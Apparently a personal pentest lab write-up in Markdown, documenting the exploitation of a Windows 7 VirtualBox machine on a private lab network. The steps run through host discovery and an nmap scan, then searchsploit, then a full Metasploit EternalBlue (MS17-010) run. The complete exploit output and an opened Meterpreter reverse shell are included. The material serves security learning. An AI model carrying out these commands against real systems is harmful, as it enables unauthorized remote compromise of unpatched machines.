- ip of win7 machine: `192.168.57.6` 
	- check using ```netdiscover```:
	```bash
	netdiscover -r 192.168.57.0/24
	```
	![](assets/Pasted%20image%2020240211164537.png)

```bash
nmap -T4 -p- -A 192.168.57.6
```

* results:
```bash
Nmap scan report for 192.168.57.6
Host is up (0.0023s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:73:c6:8b (Oracle VirtualBox virtual NIC)
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-02-11T10:46:59-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-02-11T15:46:59
|_  start_date: 2024-02-11T15:25:18
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds  
```
=> check smb exploits?
=> check Windows 7 Ultimate 7601 Service Pack 1 exploits?

```
─$ searchsploit -t Windows 7 SMB  

----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)   | windows/remote/42031.py
Microsoft Windows 7/2008 R2 - SMB Client Trans2 Stack Overflow (MS10-020) (PoC)    | windows/dos/12273.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Ex | windows/remote/42315.py
Microsoft Windows Vista/7 - SMB2.0 Negotiate Protocol Request Remote Blue Screen o | windows/dos/9594.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
- Eternalblue looks interesting

```bash
msfconsole
search eternalblue
# Matching Modules
# ================
# 
#    #  Name                                      Disclosure Date  Rank     Check  Description
#    -  ----                                      ---------------  ----     -----  -----------
#    0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
#    1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
#    2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
#    3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
#    4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
# 
# 
# Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

use exploit/windows/smb/ms17_010_eternalblue
options
set RHOSTS 192.168.57.6

check #cheks if target is vulnerable

show targets # can be set manually
# Exploit targets:
# =================
# 
#     Id  Name
#     --  ----
# =>  0   Automatic Target
#     1   Windows 7
#     2   Windows Embedded Standard 7
#     3   Windows Server 2008 R2
#     4   Windows 8
#     5   Windows 8.1
#     6   Windows Server 2012
#     7   Windows 10 Pro
#     8   Windows 10 Enterprise Evaluation
# 
# 

exploit
# msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
# 
# [*] Started reverse TCP handler on 192.168.57.5:4444 
# [*] 192.168.57.6:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
# [+] 192.168.57.6:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
# [*] 192.168.57.6:445      - Scanned 1 of 1 hosts (100% complete)
# [+] 192.168.57.6:445 - The target is vulnerable.
# [*] 192.168.57.6:445 - Connecting to target for exploitation.
# [+] 192.168.57.6:445 - Connection established for exploitation.
# [+] 192.168.57.6:445 - Target OS selected valid for OS indicated by SMB reply
# [*] 192.168.57.6:445 - CORE raw buffer dump (38 bytes)
# [*] 192.168.57.6:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
# [*] 192.168.57.6:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
# [*] 192.168.57.6:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
# [+] 192.168.57.6:445 - Target arch selected valid for arch indicated by DCE/RPC reply
# [*] 192.168.57.6:445 - Trying exploit with 12 Groom Allocations.
# [*] 192.168.57.6:445 - Sending all but last fragment of exploit packet
# [*] 192.168.57.6:445 - Starting non-paged pool grooming
# [+] 192.168.57.6:445 - Sending SMBv2 buffers
# [+] 192.168.57.6:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
# [*] 192.168.57.6:445 - Sending final SMBv2 buffers.
# [*] 192.168.57.6:445 - Sending last fragment of exploit packet!
# [*] 192.168.57.6:445 - Receiving response from exploit packet
# [+] 192.168.57.6:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
# [*] 192.168.57.6:445 - Sending egg to corrupted connection.
# [*] 192.168.57.6:445 - Triggering free of corrupted buffer.
# [*] Sending stage (201798 bytes) to 192.168.57.6
# [*] Meterpreter session 1 opened (192.168.57.5:4444 -> 192.168.57.6:49158) at 2024-02-11 11:02:03 -0500
# [+] 192.168.57.6:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# [+] 192.168.57.6:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# [+] 192.168.57.6:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

* Access via meterpreter  shell succeeded